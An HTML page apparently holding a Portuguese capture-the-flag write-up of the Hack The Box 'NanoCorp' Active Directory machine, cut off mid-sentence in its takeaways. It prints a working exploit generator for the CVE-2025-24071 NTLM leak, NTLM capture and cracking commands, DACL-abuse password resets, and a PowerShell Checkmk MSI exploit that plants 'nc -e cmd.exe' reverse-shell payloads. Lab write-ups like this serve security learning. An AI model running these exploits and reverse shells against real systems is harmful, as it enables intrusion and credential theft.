@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NanoCorp — HTB // Rel3ase</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    /* ── TOKENS ── */
+    :root {
+      --bg:         #070707;
+      --bg-2:       #0d0d0d;
+      --bg-card:    #101010;
+      --red:        #c0392b;
+      --red-bright: #e53935;
+      --red-dim:    #7f1c14;
+      --green:      #22c55e;
+      --text:       #d4d4d4;
+      --text-dim:   #666;
+      --text-muted: #333;
+      --border:     #1e1e1e;
+      --border-red: rgba(192,57,43,.35);
+      --glow:       0 0 18px rgba(229,57,53,.4);
+      --font:       'Share Tech Mono','Courier Prime',monospace;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      overflow-x: hidden;
+      line-height: 1.65;
+    }
+
+    ::selection { background: var(--red); color: #fff; }
+
+    a { color: var(--red-bright); text-decoration: none; transition: color .2s; }
+    a:hover { color: #fff; }
+
+    /* scanlines */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        to bottom,
+        transparent 0px, transparent 2px,
+        rgba(0,0,0,.05) 2px, rgba(0,0,0,.05) 4px
+      );
+      pointer-events: none;
+      z-index: 9990;
+    }
+
+    /* scrollbar */
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--red-dim); border-radius: 2px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--red); }
+
+    /* ── HEADER ── */
+    header {
+      position: sticky; top: 0;
+      z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: .8rem 2.5rem;
+      background: rgba(7,7,7,.94);
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(12px);
+    }
+    .logo {
+      font-size: .85rem; letter-spacing: .15em;
+      color: var(--red-bright); text-transform: uppercase;
+      display: flex; align-items: center; gap: .5rem;
+    }
+    .logo-bracket { color: var(--text-muted); }
+    .logo-blink {
+      display: inline-block; width: 7px; height: 13px;
+      background: var(--red);
+      animation: blink .8s step-end infinite;
+      vertical-align: middle; margin-left: 2px;
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+    .back-link {
+      font-size: .72rem; letter-spacing: .12em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      display: flex; align-items: center; gap: .5rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--red-bright); }
+    .back-link svg { width: 14px; height: 14px; fill: currentColor; }
+
+    /* ── HERO BANNER ── */
+    .writeup-hero {
+      position: relative;
+      padding: 5rem 2.5rem 3.5rem;
+      border-bottom: 1px solid var(--border);
+      overflow: hidden;
+    }
+    .writeup-hero::before {
+      content: '';
+      position: absolute; inset: 0;
+      background:
+        radial-gradient(ellipse 60% 80% at 80% 50%, rgba(192,57,43,.07) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-inner { position: relative; max-width: 860px; margin: 0 auto; }
+
+    .hero-platform {
+      font-size: .65rem; letter-spacing: .3em;
+      text-transform: uppercase; color: var(--red);
+      margin-bottom: .8rem;
+      display: flex; align-items: center; gap: .7rem;
+    }
+    .hero-platform::before {
+      content: ''; width: 20px; height: 1px; background: var(--red);
+    }
+
+    .hero-title {
+      font-size: clamp(2rem, 5vw, 3.6rem);
+      color: #fff; line-height: 1.05;
+      letter-spacing: -.01em;
+      margin-bottom: 1.2rem;
+    }
+    .hero-title em { font-style: normal; color: var(--red-bright); }
+
+    .meta-row {
+      display: flex; flex-wrap: wrap; gap: .6rem;
+      margin-bottom: 1.8rem;
+    }
+    .badge {
+      font-size: .62rem; padding: .28rem .65rem;
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      letter-spacing: .12em; text-transform: uppercase;
+    }
+    .badge.hard   { border-color: var(--red-dim); color: var(--red-bright); }
+    .badge.medium { border-color: #b45309; color: #fb923c; }
+    .badge.easy   { border-color: #15803d; color: #4ade80; }
+
+    .hero-summary {
+      font-size: .9rem; color: var(--text-dim);
+      max-width: 680px; line-height: 1.75;
+      border-left: 2px solid var(--red-dim);
+      padding-left: 1rem;
+    }
+
+    /* ── ATTACK CHAIN ── */
+    .chain-bar {
+      max-width: 860px; margin: 2.5rem auto 0;
+      display: flex; flex-wrap: wrap;
+      align-items: center; gap: .4rem;
+    }
+    .chain-step {
+      font-size: .62rem; letter-spacing: .1em;
+      text-transform: uppercase;
+      padding: .3rem .75rem;
+      border: 1px solid var(--border);
+      color: var(--text-muted);
+      white-space: nowrap;
+    }
+    .chain-arrow {
+      color: var(--red-dim); font-size: .7rem;
+    }
+    .chain-step.active { border-color: var(--red-dim); color: var(--red-bright); }
+
+    /* ── LAYOUT ── */
+    .writeup-body {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 3.5rem 2.5rem 5rem;
+    }
+
+    /* ── SECTION ── */
+    .ws {
+      margin-bottom: 3.5rem;
+    }
+    .ws-header {
+      display: flex; align-items: center; gap: .8rem;
+      margin-bottom: 1.5rem;
+      padding-bottom: .8rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .ws-num {
+      font-size: .6rem; color: var(--red);
+      letter-spacing: .2em; opacity: .7;
+      min-width: 2ch;
+    }
+    .ws-title {
+      font-size: .7rem; letter-spacing: .25em;
+      text-transform: uppercase; color: var(--red);
+    }
+
+    /* ── PROSE ── */
+    .prose {
+      font-size: .86rem; color: var(--text-dim);
+      line-height: 1.85;
+    }
+    .prose p { margin-bottom: 1rem; }
+    .prose strong { color: var(--text); }
+    .prose em { color: var(--red-bright); font-style: normal; }
+    .prose a { color: var(--red-bright); text-decoration: underline; text-underline-offset: 3px; }
+    .prose a:hover { color: #fff; }
+    .prose ul { padding-left: 1.2rem; margin-bottom: 1rem; }
+    .prose li { margin-bottom: .4rem; }
+    .prose li::marker { color: var(--red-dim); }
+
+    /* ── CODE BLOCK ── */
+    .code-block {
+      margin: 1.4rem 0;
+      border: 1px solid var(--border);
+      background: #050505;
+      overflow: hidden;
+    }
+    .code-label {
+      font-size: .6rem; letter-spacing: .2em;
+      text-transform: uppercase; color: var(--red-dim);
+      padding: .4rem .85rem;
+      border-bottom: 1px solid var(--border);
+      background: rgba(192,57,43,.04);
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .code-label .copy-btn {
+      font-size: .58rem; letter-spacing: .12em;
+      color: var(--text-muted); background: none;
+      border: none; cursor: pointer;
+      font-family: var(--font);
+      transition: color .2s;
+      padding: 0;
+    }
+    .code-label .copy-btn:hover { color: var(--red-bright); }
+    pre {
+      padding: 1rem 1.1rem;
+      overflow-x: auto;
+      font-size: .78rem;
+      line-height: 1.65;
+      color: #c8c8c8;
+      white-space: pre;
+      tab-size: 2;
+    }
+    pre .kw  { color: var(--red-bright); }   /* keywords / commands */
+    pre .st  { color: #9ecbff; }             /* strings */
+    pre .cm  { color: #444; font-style: italic; } /* comments */
+    pre .ok  { color: var(--green); }        /* success output */
+    pre .hi  { color: #fbbf24; }             /* highlights */
+    pre .ip  { color: #a78bfa; }             /* IPs / hashes */
+
+    /* inline code */
+    code {
+      background: #111;
+      border: 1px solid #1e1e1e;
+      padding: .1rem .38rem;
+      color: var(--red-bright);
+      font-family: var(--font);
+      font-size: .82em;
+    }
+
+    /* ── CALLOUT ── */
+    .callout {
+      border: 1px solid var(--border-red);
+      background: rgba(192,57,43,.05);
+      padding: 1rem 1.2rem;
+      margin: 1.4rem 0;
+      font-size: .82rem; color: var(--text-dim);
+      line-height: 1.75;
+    }
+    .callout strong { color: var(--text); }
+    .callout .callout-icon {
+      color: var(--red); font-size: .65rem;
+      letter-spacing: .2em; text-transform: uppercase;
+      display: block; margin-bottom: .5rem;
+    }
+
+    /* ── CREDS BOX ── */
+    .creds-box {
+      border: 1px solid var(--border);
+      background: #050505;
+      padding: 1rem 1.2rem;
+      margin: 1.4rem 0;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: .3rem 1.2rem;
+      font-size: .8rem;
+    }
+    .creds-key { color: var(--text-muted); letter-spacing: .1em; }
+    .creds-val { color: var(--red-bright); }
+
+    /* ── FLAG BOX ── */
+    .flag-box {
+      border: 1px solid var(--red-dim);
+      background: rgba(127,28,20,.08);
+      padding: 1rem 1.4rem;
+      margin: 1.4rem 0;
+      display: flex; align-items: center;
+      justify-content: space-between; gap: 1rem;
+      flex-wrap: wrap;
+    }
+    .flag-label {
+      font-size: .6rem; letter-spacing: .25em;
+      text-transform: uppercase; color: var(--red);
+    }
+    .flag-value {
+      font-size: .82rem; color: #fff;
+      letter-spacing: .05em;
+      word-break: break-all;
+    }
+
+    /* ── ACTOR IMAGE ── */
+    .actor-block {
+      border: 1px dashed var(--red-dim);
+      background: rgba(127,28,20,.06);
+      padding: 1.5rem;
+      margin: 1.4rem 0;
+      text-align: center;
+    }
+    .actor-block img {
+      max-width: 100%; max-height: 280px;
+      object-fit: contain; margin: 0 auto;
+      filter: grayscale(25%) brightness(.9);
+      display: block;
+    }
+    .actor-placeholder {
+      height: 100px;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      gap: .6rem; color: var(--red-dim);
+    }
+    .actor-placeholder span {
+      font-size: .65rem; letter-spacing: .2em;
+      text-transform: uppercase; color: var(--red-dim);
+    }
+    .actor-caption {
+      font-size: .62rem; letter-spacing: .15em;
+      text-transform: uppercase; color: var(--red-dim);
+      margin-top: .8rem;
+    }
+
+    /* ── TAKEAWAYS ── */
+    .takeaway {
+      display: flex; gap: 1rem;
+      margin-bottom: 1.2rem;
+      font-size: .84rem; color: var(--text-dim);
+      line-height: 1.7;
+    }
+    .takeaway-icon {
+      flex-shrink: 0;
+      color: var(--red); font-size: .65rem;
+      margin-top: .18rem; letter-spacing: .1em;
+    }
+    .takeaway strong { color: var(--text); }
+
+    /* ── AUTH FOOTER ── */
+    .writeup-auth {
+      margin-top: 3rem;
+      padding-top: 1.8rem;
+      border-top: 1px solid var(--border);
+      display: flex; align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap; gap: 1rem;
+    }
+    .auth-id { font-size: .75rem; color: var(--text-dim); }
+    .auth-id strong { color: var(--red-bright); }
+    .auth-links { display: flex; gap: 1.2rem; }
+    .auth-links a {
+      font-size: .68rem; letter-spacing: .1em;
+      text-transform: uppercase; color: var(--text-muted);
+      transition: color .2s;
+    }
+    .auth-links a:hover { color: var(--red-bright); }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2rem 2.5rem;
+      text-align: center;
+    }
+    .footer-text {
+      font-size: .62rem; color: var(--text-muted);
+      letter-spacing: .1em;
+    }
+    .footer-text span { color: var(--red); }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 640px) {
+      header { padding: .75rem 1.2rem; }
+      .writeup-hero { padding: 3.5rem 1.2rem 2.5rem; }
+      .writeup-body { padding: 2.5rem 1.2rem 4rem; }
+      .hero-title { font-size: 2rem; }
+      pre { font-size: .72rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ── HEADER ── -->
+  <header>
+    <div class="logo">
+      <span class="logo-bracket">[</span>REL3ASE<span class="logo-bracket">]</span>
+      <span class="logo-blink"></span>
+    </div>
+    <a class="back-link" href="../index.html">
+      <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+      Back to Index
+    </a>
+  </header>
+
+  <!-- ── HERO BANNER ── -->
+  <div class="writeup-hero">
+    <div class="hero-inner">
+      <div class="hero-platform">Hack The Box · Windows Server 2022 · Active Directory</div>
+      <h1 class="hero-title">Nano<em>Corp</em></h1>
+
+      <div class="meta-row">
+        <span class="badge hard">Hard</span>
+        <span class="badge">Windows</span>
+        <span class="badge">Active Directory</span>
+        <span class="badge">CVE-2025-24071</span>
+        <span class="badge">CVE-2024-0670</span>
+        <span class="badge">Nov 14, 2025</span>
+      </div>
+
+      <p class="hero-summary">
+        Domain Controller rodando Windows Server 2022. A cadeia de ataque combina um vazamento
+        de hash NTLM 0-click via arquivo <code>.library-ms</code> malicioso, abuso de permissões
+        DACL no Active Directory para movimento lateral, e escalação de privilégio pelo agente
+        de monitoramento Checkmk.
+      </p>
+
+      <!-- Attack chain visual -->
+      <div class="chain-bar">
+        <span class="chain-step active">CVE-2025-24071<br/>NTLM Leak</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step active">Hash Crack<br/>web_svc</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step active">DACL Abuse<br/>AddSelf</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step active">Password Reset<br/>monitoring_svc</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step active">WinRM SSL<br/>:5986</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step active">CVE-2024-0670<br/>SYSTEM</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── WRITEUP BODY ── -->
+  <div class="writeup-body">
+
+    <!-- 01 PORT SCAN -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">01</span>
+        <span class="ws-title">Port Scan &amp; Reconnaissance</span>
+      </div>
+
+      <div class="prose">
+        <p>Scan completo contra <code>nanocorp.htb (10.10.11.93)</code>:</p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span>nmap — full service scan</span>
+          <button class="copy-btn" onclick="copyCode(this)">copy</button>
+        </div>
+        <pre>release@Debian:~/Hackthebox_labs$ <span class="kw">sudo nmap -sV -O -sC -sT -v nanocorp.htb</span>
+
+PORT     STATE SERVICE       VERSION
+<span class="ok">53/tcp   open  domain        Simple DNS Plus</span>
+<span class="ok">80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)</span>
+<span class="ok">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos</span>
+<span class="ok">135/tcp  open  msrpc         Microsoft Windows RPC</span>
+<span class="ok">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="ok">389/tcp  open  ldap</span>
+<span class="ok">445/tcp  open  microsoft-ds?</span>
+<span class="ok">464/tcp  open  kpasswd5?</span>
+<span class="ok">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="ok">636/tcp  open  tcpwrapped</span>
+<span class="ok">3268/tcp open  ldap</span>
+<span class="ok">3269/tcp open  tcpwrapped</span>
+<span class="ok">5986/tcp open  ssl/wsmans?</span>
+| ssl-cert: Subject: <span class="hi">commonName=dc01.nanocorp.htb</span>
+|_clock-skew: <span class="hi">6h31m39s</span>
+
+Running: Microsoft Windows <span class="hi">2022</span> (88%)
+Service Info: OS: Windows</pre>
+      </div>
+
+      <div class="callout">
+        <span class="callout-icon">// Notas</span>
+        <strong>dc01.nanocorp.htb</strong> confirmado pelo certificado SSL em <code>:5986</code>.
+        Clock-skew de <strong>~6h31m</strong> detectado — necessário sincronizar o relógio local
+        antes de usar Kerberos, caso contrário
+        <code>KRB_AP_ERR_SKEW</code> inviabiliza os tickets.
+      </div>
+    </div>
+
+    <!-- 02 CVE-2025-24071 -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">02</span>
+        <span class="ws-title">Foothold — CVE-2025-24071 — 0-click NTLM Hash Leak</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          A porta 80 expõe um painel de upload de arquivos <code>.zip</code>.
+          Após leitura do blog de CTI (<a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html" target="_blank" rel="noopener">CVE-2025-24071: NTLM Hash Leak</a>),
+          a vulnerabilidade é explorada da seguinte forma:
+        </p>
+        <ul>
+          <li>Um arquivo <code>.library-ms</code> contém XML interno com a tag <code>&lt;url&gt;</code> apontando para um caminho UNC controlado pelo atacante.</li>
+          <li>Quando o ZIP é extraído — ou apenas aberto no Explorer — o Windows tenta <strong>pré-visualizar automaticamente</strong> o conteúdo do <code>.library-ms</code>.</li>
+          <li>Durante essa pré-visualização, o Explorer lê o XML e tenta acessar <code>\\attacker-IP\share</code> via SMB <strong>sem nenhuma interação do usuário</strong>.</li>
+          <li>Essa tentativa dispara automaticamente uma autenticação NTLM, enviando o hash da vítima ao servidor do atacante.</li>
+        </ul>
+        <p><strong>Exploit utilizado:</strong> <a href="https://github.com/0x6rss/CVE-2025-24071_PoC.git" target="_blank" rel="noopener">github.com/0x6rss/CVE-2025-24071_PoC</a></p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>exploit.py — geração do .library-ms malicioso</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="kw">import</span> os, zipfile
+
+<span class="kw">def</span> main():
+    file_name  = <span class="st">input("Enter your file name: ")</span>
+    ip_address = <span class="st">input("Enter IP (EX: 192.168.1.162): ")</span>
+
+    library_content = <span class="st">f"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;\\\\{ip_address}\\shared&lt;/url&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;"""</span>
+
+    lib_file = <span class="st">f"{file_name}.library-ms"</span>
+    <span class="kw">with</span> open(lib_file, <span class="st">"w"</span>, encoding=<span class="st">"utf-8"</span>) <span class="kw">as</span> f:
+        f.write(library_content)
+    <span class="kw">with</span> zipfile.ZipFile(<span class="st">"exploit.zip"</span>, <span class="st">"w"</span>, zipfile.ZIP_DEFLATED) <span class="kw">as</span> z:
+        z.write(lib_file)
+    os.remove(lib_file)
+    <span class="kw">print</span>(<span class="st">"completed"</span>)</pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>kill.library-ms — arquivo gerado</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>release@Debian:~/Downloads/CVE-2025-24071_PoC$ <span class="kw">cat kill.library-ms</span>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;<span class="hi">\\10.10.14.103\shared</span>&lt;/url&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;</pre>
+      </div>
+
+      <!-- Actor image block -->
+      <div class="actor-block">
+        <img src="/imgs/threatactor.png" alt="Possible actor who shared the CVE-2025-24071 0day exploit"
+          onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/>
+        <div class="actor-placeholder" style="display:none">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#7f1c14" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="1"/><path d="M3 9h18M9 21V9"/></svg>
+          <span>// Adicione aqui: src="../images/actor.png"</span>
+        </div>
+        <p class="actor-caption">&#9632; Possible actor who shared the CVE-2025-24071 0day</p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>Responder — captura do NTLMv2 hash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>(venv) release@Debian:~/Downloads/Responder$ <span class="kw">sudo python3 Responder.py -I tun0</span>
+[+] Listening for events...
+
+<span class="ok">[SMB] NTLMv2-SSP Client   : 10.10.11.93
+[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
+[SMB] NTLMv2-SSP Hash     :</span> <span class="ip">web_svc::NANOCORP:38a74873a2057e77:55741262F91DCBCA...</span></pre>
+      </div>
+    </div>
+
+    <!-- 03 HASH CRACK -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">03</span>
+        <span class="ws-title">Quebrando o Hash — Hashcat</span>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>hashcat -m 5600 (NetNTLMv2)</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>$ <span class="kw">hashcat -m 5600 ntlmv2.txt rockyou.txt --force</span>
+
+<span class="ip">WEB_SVC::NANOCORP:38a74873a2057e77:55741262f91d...:<span class="ok">dksehdgh712!@#</span></span>
+
+Status: <span class="ok">Cracked</span>
+Time  : 1 sec (13% of rockyou.txt)</pre>
+      </div>
+
+      <div class="creds-box">
+        <span class="creds-key">Usuário</span>  <span class="creds-val">web_svc</span>
+        <span class="creds-key">Senha</span>    <span class="creds-val">dksehdgh712!@#</span>
+        <span class="creds-key">Domínio</span>  <span class="creds-val">NANOCORP</span>
+      </div>
+    </div>
+
+    <!-- 04 AD ENUM / BLOODHOUND -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">04</span>
+        <span class="ws-title">AD Enumeration — BloodHound &amp; Impacket</span>
+      </div>
+
+      <div class="prose">
+        <p>Com as credenciais, obter TGT e enumerar o AD:</p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>getTGT.py + BloodHound-Python</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>$ <span class="kw">python getTGT.py -dc-ip 10.10.11.93 'nanocorp.htb/WEB_SVC:dksehdgh712!@#'</span>
+<span class="ok">[*] Saving ticket in WEB_SVC.ccache</span>
+$ <span class="kw">export KRB5CCNAME=WEB_SVC.ccache</span>
+
+$ <span class="kw">bloodhound-python -d nanocorp.htb -u WEB_SVC -p 'dksehdgh712!@#' -c All -ns 10.10.11.93</span>
+<span class="ok">INFO: Found 6 users    → monitoring_svc é o alvo</span>
+<span class="ok">INFO: Found 53 groups</span>
+<span class="ok">INFO: Found 2 ous      → IT_SUPPORT</span>
+<span class="ok">INFO: Found 0 trusts   → sem movimento lateral por tree/certificates</span></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>impacket-net — listagem de usuários</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>$ <span class="kw">impacket-net 'nanocorp.htb/web_svc:dksehdgh712!@#'@10.10.11.93 user</span>
+<span class="ok">  1. Administrator
+  2. Guest
+  3. krbtgt
+  4. web_svc
+  5. monitoring_svc</span></pre>
+      </div>
+
+      <div class="callout">
+        <span class="callout-icon">// Caminho de ataque — BloodHound</span>
+        <code>web_svc</code> → <strong>AddSelf</strong> em <code>IT_SUPPORT</code>
+        → <strong>ForceChangePassword</strong> sobre <code>monitoring_svc</code>
+        → <code>monitoring_svc</code> membro de <strong>Remote Management Users</strong>
+        → <strong>WinRM no DC</strong>
+      </div>
+    </div>
+
+    <!-- 05 DACL ABUSE -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">05</span>
+        <span class="ws-title">DACL Abuse — AddSelf → ForceChangePassword</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          A máquina ficou quebrada por 2 dias — após nova enumeração, confirmado que
+          o grupo <code>IT_SUPPORT</code> de fato possui <strong>ForceChangePassword</strong>
+          sobre <code>monitoring_svc</code>.
+        </p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>bloodyAD — AddSelf + ForceChangePassword</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="cm"># Adiciona web_svc ao grupo IT_SUPPORT (AddSelf)</span>
+$ <span class="kw">bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb \
+    -u web_svc -p 'dksehdgh712!@#' add groupMember it_support web_svc</span>
+<span class="ok">[+] web_svc added to it_support</span>
+
+<span class="cm"># Altera a senha do monitoring_svc (ForceChangePassword)</span>
+$ <span class="kw">bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb \
+    -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Rele4ase123$!'</span>
+<span class="ok">[+] Password changed successfully!</span></pre>
+      </div>
+    </div>
+
+    <!-- 06 WINRM -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">06</span>
+        <span class="ws-title">WinRM via Kerberos — Porta 5986 SSL</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          O <code>evil-winrm</code> padrão falha — o WinRM está exposto apenas em HTTPS
+          na porta <code>5986</code>. Solução: <strong>winrmexec.py</strong> com autenticação Kerberos.
+          Repo: <a href="https://github.com/ozelis/winrmexec.git" target="_blank" rel="noopener">github.com/ozelis/winrmexec</a>
+        </p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>impacket-getTGT + winrmexec.py</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>$ <span class="kw">impacket-getTGT -dc-ip 10.10.11.93 'nanocorp.htb/monitoring_svc:Rele4ase123$!'</span>
+<span class="ok">[*] Saving ticket in monitoring_svc.ccache</span>
+$ <span class="kw">export KRB5CCNAME=monitoring_svc.ccache</span>
+
+$ <span class="kw">python3 winrmexec.py -ssl -port 5986 -k \
+    nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass</span>
+<span class="ok">[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB</span>
+<span class="ok">PS C:\Users\monitoring_svc\Documents&gt;</span></pre>
+      </div>
+
+      <div class="flag-box">
+        <span class="flag-label">&#9632; User Flag</span>
+        <span class="flag-value">01b2848957245ab8b1350efd30efda3b</span>
+      </div>
+    </div>
+
+    <!-- 07 PRIVESC -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">07</span>
+        <span class="ws-title">Privilege Escalation — CVE-2024-0670 (Checkmk MSI Repair)</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          Em <code>C:\Windows\Temp</code> existe o binário <code>RunasCs.exe</code>, que
+          permite executar processos como outro usuário com suas permissões. O agente
+          Checkmk (<code>mk</code>) corre como <strong>SYSTEM</strong> e é vulnerável a uma
+          race condition no caminho de repair do MSI.
+        </p>
+        <p>
+          O exploit (<code>fuck.ps1</code>) realiza três etapas:
+        </p>
+        <ul>
+          <li>Localiza o MSI do Checkmk via registro: <code>HKLM:\SOFTWARE\...\DisplayName -like '*mk*'</code></li>
+          <li>Semeia arquivos <code>.cmd</code> read-only em <code>C:\Windows\Temp\</code> com o payload de reverse shell para <code>nc.exe</code></li>
+          <li>Dispara o repair: <code>msiexec.exe /fa [msi_path] /qn</code></li>
+        </ul>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>fuck.ps1 — Checkmk MSI race condition exploit</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre><span class="kw">param</span>(
+    [int]<span class="hi">$MinPID</span>  = 1000,
+    [int]<span class="hi">$MaxPID</span>  = 15000,
+    [string]<span class="hi">$LHOST</span> = <span class="st">"10.10.16.224"</span>,
+    [string]<span class="hi">$LPORT</span> = <span class="st">"4444"</span>
+)
+
+<span class="cm"># 1. Payload de reverse shell</span>
+$NcPath      = <span class="st">"C:\Windows\Temp\nc"</span>
+$BatchPayload = <span class="st">"@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"</span>
+
+<span class="cm"># 2. Localiza MSI do Checkmk</span>
+$msi = (Get-ItemProperty <span class="st">'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties'</span> |
+        Where-Object { $_.DisplayName <span class="kw">-like</span> <span class="st">'*mk*'</span> } |
+        Select-Object -First 1).LocalPackage
+
+<span class="cm"># 3. Semeia arquivos .cmd read-only</span>
+<span class="kw">foreach</span> ($ctr in 0..1) {
+    <span class="kw">for</span> ($num = $MinPID; $num -le $MaxPID; $num++) {
+        $filePath = <span class="st">"C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"</span>
+        [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
+        Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true
+    }
+}
+
+<span class="cm"># 4. Dispara o MSI repair</span>
+Start-Process <span class="st">"msiexec.exe"</span> -ArgumentList <span class="st">"/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log"</span> -Wait</pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label"><span>RunasCs — execução como web_svc → SYSTEM</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
+        <pre>PS C:\temp&gt; <span class="kw">.\RunasCs.exe web_svc "dksehdgh712!@#" \
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\fuck.ps1"</span>
+
+<span class="cm"># Apesar do erro de output sobre o .ps1 não ser encontrado,
+# a conexão reversa chega no listener como SYSTEM/Administrator</span>
+
+C:\Users\Administrator\Desktop&gt; <span class="kw">type root.txt</span></pre>
+      </div>
+
+      <div class="flag-box">
+        <span class="flag-label">&#9632; Root Flag</span>
+        <span class="flag-value">791ce35038852fa2c789c840325db122</span>
+      </div>
+    </div>
+
+    <!-- 08 TAKEAWAYS -->
+    <div class="ws">
+      <div class="ws-header">
+        <span class="ws-num">08</span>
+        <span class="ws-title">Key Takeaways</span>
+      </div>
+
+      <div class="takeaway">
+        <span class="takeaway-icon">▸</span>
+        <span>
+          <strong>CVE-2025-24071</strong> é um vetor de coerção NTLM 0-click. Qualquer plataforma
+          que processa ZIPs contendo <code>.library-ms</code> é potencialmente vulnerável —
